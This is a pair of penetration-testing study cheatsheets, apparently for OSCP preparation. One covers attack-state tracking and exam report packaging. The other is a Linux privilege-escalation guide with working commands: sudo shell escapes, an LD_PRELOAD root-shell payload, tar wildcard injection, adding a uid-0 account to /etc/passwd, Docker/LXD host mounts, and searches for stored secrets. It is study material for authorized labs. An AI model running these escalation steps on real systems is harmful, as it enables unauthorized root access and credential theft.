# Integrated Attack and Reporting Cheatsheet [← Cheatsheet index](README.md) | [Full procedure](../reference/08-evidence-reporting/01-attack-tracking-and-evidence.md) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Complete attacks and retain reproducible evidence](../notes/methods/integration.md) ## State map ```text HOSTS: host/IP | role | reachable from | services | evidence IDENTITIES: local/domain | credential type | validated access | privilege | source ROUTES: source -> tunnel/pivot -> destination | DNS | callback path HYPOTHESES: observation | prerequisite | test | status TRANSITIONS: old state -> action -> new state | decisive evidence EVIDENCE: objective | reproduction | identity/IP proof | screenshot | submission/task state ``` ## Core attack loop ```text Observe → Enumerate → Interpret → Hypothesize → Validate prerequisite → Exploit → Verify new state → Re-enumerate → Escalate/Move → Document ``` Keep two queues: ```text COVERAGE: source position → host → endpoint → application → enumeration state HYPOTHESIS: observation → desired transition → prerequisite → next test → status ``` ## State-change router | New evidence/state | Re-enter | | --- | --- | | Host/address/interface/listener/route | Discovery and service identification from the reachable source | | Credential/key/hash/ticket | Classification, compatible validation and authenticated enumeration | | Application role/session | Application mapping through the new authorization view | | Execution/shell | Host/identity/network verification, session repair and local enumeration | | Root/Administrator/SYSTEM | Protected credentials, services, sessions, routes and domain context | | Domain identity/group/right | AD objects/rights plus reachable host/service paths | | Pivot/proxy | Discovery from new vantage; separate delivery/callback route design | ## Candidate card and priority ```text Observation: Desired transition: Prerequisites: Confirmed / unknown: Cheapest discriminating test: Success / failure meaning: Noise, cleanup and handoff: Status / evidence: ``` Priority: confirmed prerequisite/direct transition → one cheap missing prerequisite → information-expanding path → multi-assumption/disruptive path → disproven path closed until new evidence. ## Standalone sequence ```text scope/objective → TCP + bounded UDP coverage → service/web enumeration → files/config/identity opportunities → credential, manual weakness or exact exploit prerequisite → bounded effect → verified session → initial-access evidence → local enumeration → controlled object + privileged consumer + trigger → verified elevated identity → final evidence + cleanup + reproduction path ``` ## Assumed-breach AD sequence ```text starting credential → identity + DNS/time/DC + route → hosts/services + directory objects/rights → ranked identity/host transition → compatible password/hash/ticket use → verified session/new identity → authenticated re-enumeration → route/lateral movement → final domain objective and evidence ``` For every edge keep `identity → effective group/right → target → protocol/route → resulting state` together. ## Save output ```bash mkdir -p evidence/nmap evidence/web evidence/loot evidence/screenshots nmap -Pn -sV -sC -p PORTS TARGET -oA evidence/nmap/TARGET-services script -q -f evidence/session.txt sha256sum FILE | tee FILE.sha256 ``` Run `exit` to close/flush the `script` transcript. ```powershell Start-Transcript -Path .\evidence\powershell-session.txt # commands Stop-Transcript ``` ## Verify state ```bash date -Is; hostname; id; ip addr; ip route ``` ```cmd echo %DATE% %TIME% hostname whoami /all ipconfig /all route print ``` ## Transition record ```text observation -> prerequisite -> exact action -> decisive output -> host/identity -> new capability -> cleanup -> re-enumeration ``` ## Dead-end recovery ```text freeze current state → mark last decisive result per path → check coverage and authenticated views → separate tool/environment failure from attack evidence → choose one test that can change the decision → switch to the strongest supported branch → return only when new evidence changes a prerequisite ``` | Result | Label/action | | --- | --- | | Test did not exercise prerequisite | Inconclusive; redesign test | | Exact prerequisite absent | Disproven; close path | | Authentication succeeds, action denied | Authorization boundary; enumerate rights | | New identity/route, old results reused | Stale state; re-enumerate | | No decisive candidates | Coverage gap; return to enumeration | ## Exploit modifications ```bash git diff --no-index original.py modified.py > exploit-changes.diff sha256sum original.py modified.py ``` Record original URL/commit, changed lines, why, build/payload command, execution and result. ## Before final export - Evidence appears next to each claim. - Target sections follow the control-panel/grading order. - Proof is read with `cat`/`type` from its original location in an interactive target shell. - Each proof screenshot includes the target IP; the control-panel submission is tracked separately before practical time ends. - Screenshots show required host/identity/IP/objective context. - Steps are ordered and reproducible. - Required scripts/PoCs are included as text inside the PDF, not as extra archive members. - Secrets are absent from public notes. - PDF is visually checked after export. - Archive/upload naming, size and hash follow the current official guide. - No AI is used on actual exam targets, proofs or reporting. ## Package rehearsal ```bash 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf 7z l OSCP-OS-XXXXX-Exam-Report.7z 7z t OSCP-OS-XXXXX-Exam-Report.7z md5sum OSCP-OS-XXXXX-Exam-Report.7z ``` ```powershell Get-FileHash -Algorithm MD5 -LiteralPath '.\OSCP-OS-XXXXX-Exam-Report.7z' ``` Current baseline: exact case-sensitive names, one PDF in a non-password-protected `.7z`, no larger than 200 MB. Visually inspect every PDF page, compare local/upload MD5, complete the final submission action and retain acknowledgement. Recheck the official guide immediately before use. Use the official Word/LibreOffice template unless a Markdown/Pandoc pipeline has already passed a complete dummy export and archive rehearsal. ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. ### Complete attacks and retain reproducible evidence
Find: Maintain state and select the next evidence-producing test Inspect the current private host/identity/route notes and compare each proposed action with a named unresolved question. ```text For each candidate record: HOST | IDENTITY | ROUTE | OBSERVED CAPABILITY | MISSING CONDITION | NEXT DISCRIMINATING TEST ``` > **Recognize:** The ledger distinguishes an unvalidated hypothesis from an enabled candidate and a missing coverage question. > **Validate next:** Verify the next test resolves a stated uncertainty and its expected outcomes change the decision. [Maintain state and select the next evidence-producing test](../notes/methods/integration.md#attack-state).
Commands and use-case variants > **Need:** An assigned objective, scope and accumulated host/identity/route evidence. Explicit scope/objective and a record of observations, unknowns and available capabilities Before interacting with a target, record: ```text scope and explicit exclusions objective and required evidence starting identity/credential and whether it is local, domain or application scoped source host, interface, route and DNS context allowed/restricted tools and the current Metasploit target decision case directory and note/evidence locations cleanup or restoration obligations ``` An interesting vulnerability is not automatically the objective. The attack is complete only when the required access or privilege is verified and the reproduction/evidence chain is retained. Create a private case workspace using target-neutral names until the real scope is known: ```bash mkdir -p case/{00-admin,01-scans,02-services,03-web,04-exploits,05-loot,06-sessions,07-screenshots,08-report} touch case/00-admin/{scope.md,state.md,credentials.md,routes.md,hypotheses.md,transitions.md} ``` Do not put exam or private target material in a public repository. Keep target-specific values in a private case/lab record, not this public repository. ```text HOSTS - host/IP | role | reachable from | open services | evidence file IDENTITIES - local/domain identity | credential type | validated services | privilege | source ROUTES - source -> listener/tunnel -> pivot -> destination | DNS point | callback path HYPOTHESES - observation | hypothesis | prerequisite | next discriminating test | status TRANSITIONS - old state -> action -> new access/identity/route | decisive output | evidence EVIDENCE COVERAGE - objective | reproduction complete? | identity/IP proof? | screenshot? | panel/task state ``` Label each claim `observed`, `inferred`, `possible`, `confirmed`, `disproven` or `inconclusive`. Close a path only with a test that addressed its prerequisite; do not confuse a tool error with a disproven attack hypothesis. ```text Observe → Enumerate → Interpret → Hypothesize → Validate prerequisite → Exploit the confirmed primitive → Verify the new state → Re-enumerate from that state → Escalate, move or pivot → Capture evidence and cleanup ``` The sequence is a loop, not a one-time checklist. A state change routes work back to the relevant earlier stage: | New state | Mandatory re-entry | | --- | --- | | Hostname, address, interface, listener or route | Discovery and service identification from the source position that can reach it | | Credential, key, hash or ticket | Classify identity/material, validate compatible access, then authenticated enumeration | | Application role/session | Revisit the same application and objects through the new authorization view | | Command execution or shell | Verify host/identity/network, repair the session, transfer only what is needed, start local enumeration | | Administrator/root/SYSTEM | Re-enumerate protected files, credentials, services, sessions, routes and domain context | | Domain identity/group/right | Rebuild reachable host/service/object paths and validate the specific right | | Pivot or proxy | Repeat discovery from the new vantage point; separately design callback and delivery routes | ##### Keep two queues The **coverage queue** prevents missed surfaces: ```text host/source position → endpoint → confirmed application → required enumeration → state ``` The **hypothesis queue** prevents random exploitation: ```text observation → possible transition → prerequisite → cheapest discriminating test → decisive success/failure → next action ``` Do not spend the whole assessment deepening one hypothesis while high-value coverage remains unknown. Conversely, do not keep scanning after a confirmed path only to avoid validating it. Create one card per distinct mechanism: ```text Observation: Desired state transition: Required prerequisites: Already confirmed: Still unknown: Cheapest discriminating test: Success means: Failure means: Noise/change/cleanup: Handoff if successful: Status/evidence: ``` Rank without false numerical precision: 1. **Confirmed prerequisite, direct objective transition.** Test first. 2. **Strong observation, one cheap missing prerequisite.** Validate next. 3. **Useful information path.** Prefer when it can unlock several branches. 4. **Multiple unsupported assumptions or disruptive action.** Defer. 5. **Disproven prerequisite.** Close until new evidence changes it. Evidence strength overrides technique popularity. Prefer low-cost tests that split plausible explanations and create reusable information. A path that succeeds only after several unverified assumptions is not yet a high-priority path. > **Verify:** Every proposed action must name the uncertainty it resolves and the result that changes the decision. > **If it fails:** An untested assumption must remain possible/inferred, not confirmed. Record disproven contexts to avoid repeating them without new evidence.
Find: Integrate a standalone or assumed-breach AD attack Take the current verified capability and compare it with the receiving method's starting access and missing conditions. ```text CURRENT RESULT -> CANDIDATE NEXT METHOD -> REQUIRED INPUT -> MISSING PROOF ``` > **Recognize:** A file read does not itself create a shell; the chain needs an actual credential/identity transition. > **Validate next:** Verify every produced material type, account, route and service-specific right before connecting the next step. [Integrate a standalone or assumed-breach AD attack](../notes/methods/integration.md#attack-chains).
Commands and use-case variants > **Need:** An assigned objective, scope and accumulated host/identity/route evidence. An assigned objective and current host/identity/route map; each next method's enabling conditions must be produced or discovered Use the earlier procedure linked at each transition; the integration layer owns order and state: 1. Record scope, objective, source position and evidence requirements. 2. Establish TCP coverage, bounded UDP coverage and confirmed application identities. 3. Enumerate every confirmed service in its anonymous/current context; map web requests, hosts, parameters, content and roles. 4. Search files, configuration, repositories and application data for identities or prerequisites. 5. Build candidate cards for manual application weaknesses, compatible credentials and exact public-exploit prerequisites. 6. Validate one prerequisite at a time and prove the smallest useful effect. 7. Convert execution into a verified session; record host, identity, privilege, interfaces and routes. 8. Capture the initial-access transition and any required unprivileged objective before changing state. 9. Enumerate local privilege paths as controlled object → effective permission → privileged consumer → trigger → effect. 10. Verify the elevated identity, capture required evidence, re-enumerate protected context and remove exercise artifacts. 11. Reconstruct the ordered reproduction path while the commands and assumptions are still known. Failure at a step returns to its owning block. Do not skip service enumeration because one banner suggests a CVE, and do not start privilege escalation before proving which host and identity the shell represents. ```text starting credential → local/domain identity + DNS/time/DC context → reachable host/service map → users/groups/computers/shares/SPNs/ACLs/sessions → ranked identity or host transition → compatible password/hash/ticket use → verified session/new identity → re-enumeration → route/movement to next host → higher domain privilege/objective ``` Keep five variables together for every edge: ```text controlled identity effective group/right target object or host required protocol/route resulting identity/access ``` BloodHound and enumerators generate candidate edges. Validate the underlying group membership, ACL, session, service right, route and authentication material before acting. After every new identity or host session, repeat authenticated enumeration rather than continuing from the old authorization view. For multihop work, maintain a route diagram and a separate callback diagram. A route that permits an operator tool to reach a service does not prove that a payload can return to its handler. > **Verify:** For every transition record its prerequisite evidence and independently verified effect; no step is complete because the next tool launched. > **If it fails:** A broken route or invalid account context can halt an otherwise plausible chain. Return to the first unmet prerequisite.
Find: Recover from dead ends without repeating disproven paths Compare recent attempts with the last saved working state and classify the first newly introduced boundary. ```text LAST VERIFIED STATE | FIRST NEW FAILURE | EXACT ERROR | CHANGED CONDITION | NEXT CONTROL ``` > **Recognize:** Repeated payload changes are not testing the first missing transfer/route condition. > **Validate next:** Reproduce the last proof and isolate one new condition at a time; preserve rejected paths and return conditions. [Recover from dead ends without repeating disproven paths](../notes/methods/integration.md#attack-recovery).
Find: Capture state-transition, proof and exploit-adaptation evidence At every observed access/identity/privilege change inspect whether saved output ties the effect to the correct host, token and command/request. ```bash hostname id ip addr ``` > **Recognize:** A success screenshot or identity line can be real while the reproduction path is incomplete. > **Validate next:** Capture the exact source/destination, method, material context, transition, relevant proof and adaptation steps privately. [Capture state-transition, proof and exploit-adaptation evidence](../notes/methods/integration.md#attack-evidence).
Commands and use-case variants > **Need:** An assigned objective, scope and accumulated host/identity/route evidence. Known destination/identity, observable effect and a private evidence destination; actual exam proof requirements must be read from current official guidance Linux: ```bash date -Is hostname id ip addr ip route ``` Windows: ```cmd echo %DATE% %TIME% hostname whoami /all ipconfig /all route print ``` For each access or escalation, retain: 1. the observation that selected the path; 2. the exact command/request with secrets redacted in the reusable copy; 3. relevant output or response; 4. host and identity verification; 5. the effect/new capability; 6. cleanup/restoration; and 7. the next re-enumeration result. Use a compact transition packet: ```text time/timezone | source host/interface | target host/service | starting identity observation | prerequisite | exact action | decisive output new identity/access/route | evidence files | cleanup | next re-enumeration ``` Capture the transition when it happens. Reconstructing it later risks losing a required token, request, route, working directory, listener or source identity. ```bash mkdir -p evidence/nmap evidence/web evidence/loot evidence/screenshots nmap -Pn -sV -sC -p PORTS TARGET -oA evidence/nmap/TARGET-services script -q -f evidence/session.txt ``` Run `exit` when finished so the transcript closes and flushes. Do not record unrelated secrets in a broad transcript. ```powershell Start-Transcript -Path .\evidence\powershell-session.txt # commands Stop-Transcript ``` Hash important transferred or generated artifacts: ```bash sha256sum FILE | tee FILE.sha256 ``` Never publish credentials, flags, target IPs, full private transcripts or copyrighted course text to this repository. Current official exam guidance requires proof-file content to be displayed from its original location in an interactive target shell and included in a screenshot with the target IP. The control-panel submission is separate and must occur before the exam ends. Recheck the guide immediately before an exam because these rules can change. Linux example layout: ```bash hostname; id; ip addr cat /root/proof.txt ``` Windows example layout: ```cmd hostname & whoami & ipconfig type C:\Users\Administrator\Desktop\proof.txt ``` Use the actual objective-provided path and required identity. Do not use AI on actual exam targets, proofs or reports; the current guide prohibits AI chatbots during the exam. For an unmodified exploit, retain its source URL rather than pasting pages of code. For a modified exploit, retain: - original URL and version/commit; - local modified copy; - a focused diff/highlight of changes; - why each change was necessary; - build/interpreter command and dependencies; - payload-generation command, if any; and - exact execution and result verification. ```bash git diff --no-index original.py modified.py > exploit-changes.diff sha256sum original.py modified.py ``` ```markdown ### Objective / result **Starting state:** source host, network position and identity. 1. Observation and evidence. 2. Enumeration command/request and decisive output. 3. Vulnerability/prerequisite validation. 4. Exploitation command/request, including required listener/route. 5. Session verification: host, identity and privilege. 6. Escalation evidence and final verification. 7. Cleanup/restoration. **Artifacts:** screenshots, saved output, hashes and exploit source/diff. ``` Write steps in execution order. Explain why a command was needed and what the output established; a transcript alone is not a report. > **Verify:** Tie evidence to the correct target and transition, with no invented success or missing reproduction step. > **If it fails:** A screenshot without identity/target context or an exploit success string without effect is incomplete. Keep real targets, credentials and proofs private.
Find: Build and validate the report and submission artifacts Inspect the report rendered from retained transitions and the actual archive contents; export success is only one part of readiness. ```bash pdfinfo REPORT.pdf 7z l REPORT.7z md5sum REPORT.7z ``` > **Recognize:** The container is valid while a reproduction instruction is unreadable; inspect rendered content as well as file structure. > **Validate next:** Verify complete reproduction, legible pages, current required names/content and upload/local checksum when applicable. [Build and validate the report and submission artifacts](../notes/methods/integration.md#attack-report).
Commands and use-case variants > **Need:** An assigned objective, scope and accumulated host/identity/route evidence. Complete reproduction path, required screenshots/proofs, suitable document tooling and the current submission naming/archive rules For every achieved objective, the report path should read: ```text starting state and scope → decisive enumeration → prerequisite/vulnerability validation → exact exploitation action → session/identity verification → privilege or movement transition → final objective evidence → cleanup/restoration ``` Include only enough non-decisive enumeration to make the selection understandable. Screenshots need captions and nearby interpretation; they do not replace commands or prose. Raw transcripts are supporting artifacts, not the final narrative. Current official exam grading follows the target order used in the report. Keep target/objective labels aligned with the control panel and place each target's complete chain together. Recheck the current guide immediately before a mock or exam. The current baseline is one PDF inside a non-password-protected `.7z`, exact case-sensitive filenames and an archive no larger than 200 MB: ```bash 7z a OSCP-OS-XXXXX-Exam-Report.7z OSCP-OS-XXXXX-Exam-Report.pdf 7z l OSCP-OS-XXXXX-Exam-Report.7z 7z t OSCP-OS-XXXXX-Exam-Report.7z md5sum OSCP-OS-XXXXX-Exam-Report.7z ``` Windows hash fallback for a local rehearsal: ```powershell Get-FileHash -Algorithm MD5 -LiteralPath '.\OSCP-OS-XXXXX-Exam-Report.7z' ``` Inspect every exported PDF page before archiving. Confirm that code is not clipped, screenshots remain readable, captions match the correct target and the archive contains only the required PDF. Required scripts and PoCs belong as text inside that PDF, not as extra archive members. The current guide recommends creating/uploading from Kali and warns of a Windows 11 archive compatibility issue. Compare the local MD5 with the upload site's value, click the final submission control and retain the acknowledgement. The official Word or LibreOffice template is the reliable baseline. A Markdown/Pandoc pipeline, including Hexdump's `report/` generator, is a viable alternative only after a complete dummy export/archive rehearsal; do not install or debug a new report stack during an assessment. - Commands are copyable and placeholders/secrets are resolved in the private report. - Screenshots are legible and show required identity/IP/proof context. - Every claim is supported by nearby evidence. - Target order and objective labels match the control panel. - Exploit modifications and payload-generation steps are documented. - The final PDF is visually reviewed after export. - Archive name/format/size and upload hash match current official requirements. > **Verify:** Verify reproduction, legible pages, correct required names/content and matching local/upload checksum when applicable. > **If it fails:** Do not infer acceptance from successful compression. Actual exam and report-writing phases prohibit AI assistance; use the prepared general notes independently.

# Linux Privilege Escalation Cheatsheet [← Cheatsheet index](README.md) | [Full procedure](../reference/05-local-privilege-escalation/01-linux-privilege-escalation.md) | [Master Notes](../notes/Master_Notes.md#linux-selection-logic) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Escalate privileges on Linux](../notes/methods/linux-privesc.md) ## Early tool-assisted pass Use a reviewed, transferred build in the current host context. Save output and select a concrete finding; a highlight is not the elevated identity. > **Reuse discovery:** repeated inventory commands are optional only when the relevant saved LinPEAS output is complete, readable and from the same host and identity. Check the build/options used and any errors; a missing finding is not a negative result. Revisit affected checks after a new identity, privilege, mount or service change. Keep the focused validation of every selected candidate. ```bash id uname -m sh ./linpeas.sh | tee linpeas.txt ``` [Tool-to-finding workflow](../notes/methods/linux-privesc.md#first-pass-tools-and-findings). ## Candidate proof ```text controlled object → effective permission → privileged consumer → execution identity → trigger → effect → verified identity ``` > Do not exploit an automated highlight until every link is supported. Prioritize credentials/sudo, writable root consumers and SUID/capabilities before software/kernel exploits. ## First pass > **Discovery may already be covered:** reuse captured OS, network, process and mount inventory. Confirm the current identity directly and inspect the actual `sudo -l` rules; a noninteractive password failure does not establish that no sudo rights exist. ```bash hostname; id; groups uname -a; cat /etc/os-release; getconf LONG_BIT pwd; umask; env ip addr; ip route; ss -lntup; ss -lxnp ps auxf mount; findmnt; lsblk; df -hT sudo -n -l 2>&1 sudo -l ``` ```bash getent passwd awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd ``` ## Prove effective permissions > **Validate the finding:** keep the exact-object, parent-directory, ACL and mount checks below. A broad writable-file list does not establish control of a privileged consumer. Repeating the broad writable inventory is optional when equivalent current output is available. ```bash namei -l /PATH/TO/OBJECT stat /PATH/TO/OBJECT /PATH/TO/PARENT getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS find / -xdev -type f -writable -ls 2>/dev/null find / -xdev -type d -writable -ls 2>/dev/null ``` > Parent write+execute may permit replacement. ACLs can override the mode-bit impression. `nosuid` blocks SUID/SGID/file capabilities; `noexec` blocks direct execution; `ro` blocks changes. ## Credentials and files > **Discovery may already be covered:** use collected file paths and credential candidates to choose a specific readable artifact. **Investigate when indicated:** inspect the application's real configuration and referenced files; a generic secret search is not complete application coverage. Verify any recovered identity and its relevant access. ```bash history 2>/dev/null find /home /root -maxdepth 3 -type f \ \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \ -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \ -readable 2>/dev/null grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \ /var/www /opt /srv /etc 2>/dev/null | head -n 200 ``` ```bash ps auxww ps eww -u root 2>/dev/null tr '\0' ' ' < /proc/PID/cmdline 2>/dev/null; echo tr '\0' '\n' < /proc/PID/environ 2>/dev/null w; who; last -n 20 env | grep -E 'SSH_AUTH_SOCK|TMUX|STY' tmux ls 2>/dev/null screen -ls 2>/dev/null find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null ``` > Record user/service context before `su`, `sudo`, SSH or application validation. `/proc` access and short process lifetime can hide values. Session/agent sockets require effective access and a useful live identity. ## Sudo > **Run/context:** on the Linux foothold, as the identity whose sudo rights you are testing. **Decide:** an allowed command is only a candidate; resolve its run-as identity and exact argument restrictions. If the attempted operation fails, check [effective permissions](#prove-effective-permissions) and the [failure map](#failure-quick-map) before trying a different permitted operation. > **Validate the finding:** retain the exact rule, run-as identity, arguments, environment restrictions and allowed execution mode. Reuse a complete current rule listing, but do not substitute a LinPEAS highlight for reading that rule. ```bash sudo -n -l 2>&1 sudo -l sudo --version ``` Check: run-as user/group, exact path, arguments/wildcards, password tag, `SETENV`, `env_keep`, `secure_path`, `NOEXEC`. ```bash sudo /usr/bin/find . -exec /bin/sh \; -quit sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}' sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' ``` > Match exact rule and mode in [GTFOBins](https://gtfobins.github.io/). A binary name alone is insufficient.
LD_PRELOAD only when allowed/preserved ```bash sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD' ``` ```c #include #include void _init(void) { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/sh"); } ``` ```bash gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM ```
## SUID / SGID / capabilities > **Discovery may already be covered:** reuse the SUID/SGID and file-capability inventories if those checks completed. **Validate the finding:** inspect the selected binary, mount restrictions, namespace, effective capability and privilege-preserving operation before using it. ```bash find / -xdev -type f -perm -4000 -ls 2>/dev/null find / -xdev -type f -perm -2000 -ls 2>/dev/null getcap -r / 2>/dev/null ``` ```bash namei -l /PATH/TO/BINARY stat /PATH/TO/BINARY file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' strings /PATH/TO/BINARY | head -n 150 dpkg -S /PATH/TO/BINARY 2>/dev/null rpm -qf /PATH/TO/BINARY 2>/dev/null ``` Capability triage: ```text High priority: cap_setuid, cap_setgid, cap_dac_override, cap_dac_read_search, cap_sys_ptrace, cap_sys_admin, cap_setfcap, cap_sys_module Contextual: cap_net_raw and narrow service capabilities ``` ```bash capsh --print 2>/dev/null grep '^Cap' /proc/self/status /PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")' ``` > Last command requires effective `cap_setuid` on that exact interpreter. Check bounding set, namespace, mount and privilege retention. ## Cron, timers, services and short-lived processes > **Discovery may already be covered:** reuse collected cron, timer and service entries. **Investigate when indicated:** trace suspicious scripts and referenced inputs, or observe transient execution with pspy. A snapshot does not settle short-lived jobs, execution identity or a usable trigger. ```bash crontab -l 2>/dev/null cat /etc/crontab cat /etc/anacrontab 2>/dev/null atq 2>/dev/null ls -la /etc/cron.* /var/spool/cron 2>/dev/null grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100 systemctl list-timers --all systemctl list-unit-files --type=service systemctl list-units --type=service --state=running systemctl cat UNIT systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles ``` ```bash ./pspy64 ./pspy64 -pf -i 1000 ``` ```bash namei -l /PATH/TO/SCRIPT stat /PATH/TO/SCRIPT /PATH/TO/PARENT getfacl -p /PATH/TO/SCRIPT /PATH/TO/PARENT 2>/dev/null ``` > Need controllable referenced object + higher run identity + schedule/restart trigger. Cron environment differs from the interactive shell; writable service config still needs reload/restart. Use the same chain for backup, logrotate, package-maintenance and custom housekeeping hooks. ## PATH hijacking > **Investigate when indicated:** a writable PATH entry is a lead. Validate the privileged consumer's actual command lookup and environment; your interactive PATH alone does not prove this route. ```bash echo "$PATH" | tr ':' '\n' echo "$PATH" | tr ':' '\n' | while IFS= read -r d; do [ -z "$d" ] && d=. [ -w "$d" ] && ls -ld "$d" done strings /PATH/TO/PRIVILEGED_BINARY | grep -E '(^|[^/])(cp|tar|service|sh|bash|cat)( |$)' ``` ```bash printf '#!/bin/sh\n/usr/bin/id > /tmp/path-proof\n' > /WRITABLE/DIR/helper chmod 700 /WRITABLE/DIR/helper PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER cat /tmp/path-proof ``` > Need relative command + consumer's effective PATH + earlier writable directory + privileged trigger. ## Wildcard option injection > **Investigate when indicated:** inspect a privileged job that expands controlled filenames. Verify its actual working directory, utility behavior and trigger even if an enumerator identified a wildcard candidate. ```bash grep -RniE 'tar .+\*|chown .+\*|chmod .+\*|rsync .+\*' \ /etc/cron* /etc/systemd /opt /usr/local 2>/dev/null ``` GNU tar, only in the privileged job's writable working directory: ```bash printf '#!/bin/sh\n/usr/bin/id > /tmp/wildcard-proof\n' > proof.sh chmod 700 proof.sh touch -- '--checkpoint=1' touch -- '--checkpoint-action=exec=sh proof.sh' ``` > Confirm expansion, option support/order, utility implementation, identity and trigger. ## Writable account and policy files > **Discovery may already be covered:** reuse current account/policy-file permission candidates. **Validate the finding:** verify exact effective write or replacement access and a recovery path before changing an account or policy file. ```bash ls -l /etc/passwd /etc/shadow /etc/sudoers namei -l /etc/passwd getfacl -p /etc/passwd 2>/dev/null ```
Writable /etc/passwd — disposable authorized lab ```bash cp /etc/passwd /tmp/passwd.backup HASH=$(openssl passwd -6 'TEMP_PASSWORD') printf 'root2:%s:0:0:root:/root:/bin/bash\n' "$HASH" >> /etc/passwd su - root2 id ``` > Preserve/restore the original. Avoid direct change without a recovery path.
## Groups, sockets and containers > **Discovery may already be covered:** reuse group membership and socket inventory. **Validate the finding:** check access to the actual daemon/socket, its authority and host/namespace boundary; a group name or installed client alone is insufficient. ```bash id ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null docker version 2>/dev/null docker images docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh ``` ```bash lxc image list lxc init IMAGE_ALIAS privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true lxc start privesc lxc exec privesc /bin/sh ``` > Docker/LXD need actual daemon rights and suitable configuration/image. Also investigate `disk`, `shadow`, `adm`, `systemd-journal` and `libvirt` by the resource they expose. ## Mounts, NFS, local services and libraries > **Discovery may already be covered:** reuse the collected mounts and listening endpoints. **Investigate when indicated:** validate export mappings, service authorization or the privileged program's real library resolution for the selected candidate. ```bash findmnt cat /etc/fstab mount ss -lntup ss -lxnp ``` > NFS privesc requires a writable `no_root_squash` export plus target execution from a mount where SUID is effective. Root-only listeners/sockets still need a controllable privileged action. ```bash file /PATH/TO/BINARY readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED' ldd /PATH/TO/BINARY 2>/dev/null ``` > Library hijacking needs a privileged dynamic consumer and a writable selected search location/preserved variable. Prefer `readelf` when the executable is untrusted. ```bash grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT /PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))' ``` > For interpreter/module hijacking, prove the privileged script's actual import/include search order; an interactive search path may differ. ## Software/kernel candidates — last > **Investigate when indicated:** assess an affected build/configuration after stronger permission-backed leads. A version or CVE highlight is a candidate, not proof that the running kernel or package is exploitable. ```bash uname -a cat /proc/version cat /etc/os-release dpkg -l 2>/dev/null rpm -qa 2>/dev/null sudo --version lsmod sysctl kernel.unprivileged_userns_clone 2>/dev/null ``` ```bash searchsploit "PRODUCT VERSION local privilege escalation" searchsploit -x EDB_ID searchsploit -m EDB_ID gcc -Wall -Wextra exploit.c -o exploit file exploit sha256sum exploit ``` > Match exact build/backports, architecture, configuration, namespace/capability, mitigations and dependencies. Review source and crash/recovery risk. ## Automated candidate generation > **Optional repeated survey:** if the initial LinPEAS run completed and its output has been reviewed, do not rerun it unchanged by default. Choose additional collection only for a named gap, unavailable check or changed access context. ```bash ./linpeas.sh | tee linpeas.txt ./lse.sh | tee lse.txt ./lse.sh -l1 | tee lse-l1.txt ./unix-privesc-check standard > unix-privesc-check.txt ``` > LinPEAS `-a` is slower/noisier and adds password attempts/process monitoring; use only when justified. LSE `-l2` and `unix-privesc-check detailed` are later depth, not baseline. Transfer a trusted copy and record its hash instead of piping an unverified download to `sh`. ## Failure quick map | Symptom | Next check | | --- | --- | | Sudo escape fails | Exact args/run-as, `NOEXEC`, privilege drop, MAC logs | | SUID/capability stays low | Owner/mode/exact path, `nosuid`, effective/bounding set, namespace | | Cron/service never fires | Definition, run user, schedule/restart, PATH/shell/cwd, pspy/logs | | PATH/wildcard ignored | Absolute path or reset PATH; expansion cwd/option parsing | | Docker denied | Socket ACL, active group session, rootless/authz/userns controls | | Kernel PoC fails | Exact affected build/config, arch, toolchain/dependencies | | Enumerator reports “possible” | Manually prove object, consumer, identity and trigger | ## Verify and re-enumerate ```bash id; whoami; groups hostname; pwd ip addr; ip route ``` > Re-enumerate protected files, credentials, services, listeners, mounts and routes after the identity change. ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. ### Escalate privileges on Linux
Find: Establish Linux state and choose an escalation candidate At a new shell collect effective IDs/groups, current mounts, root-owned activity and exact sudo rules before choosing a technique. ```bash id findmnt ps auxww sudo -l ``` > **Recognize:** The sudo rule and privileged backup consumer open different candidate families; neither should be replaced by an automatic kernel choice. > **Validate next:** For each candidate establish exact permitted operation/object, run-as identity and trigger. [Establish Linux state and choose an escalation candidate](../notes/methods/linux-privesc.md#linux-state).
